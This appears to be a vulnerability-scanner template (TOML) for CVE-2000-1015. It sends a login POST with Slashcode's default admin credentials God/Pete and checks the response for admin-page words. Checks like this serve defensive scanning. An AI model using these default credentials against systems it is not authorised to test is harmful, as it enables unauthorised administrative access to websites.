[info]
author = "AVE"
description = "检测 Slashcode 默认管理密码漏洞，尝试使用默认凭据 God/Pete 登录后台，验证是否存在未修改默认密码的安全风险"
id = "POC-AVE-2000-1050"
name = "CVE-2000-1015 PoC"
severity = "high"
tags = ["cve-2000-1015"]
vuln_id = [
    "CVE-2000-1015",
    "AVE-2000-1050",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/login"
protocol = "http"

[poc.requests.body]
content = "user=God&passwd=Pete"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "seclev",
    "admin",
    "menu",
]
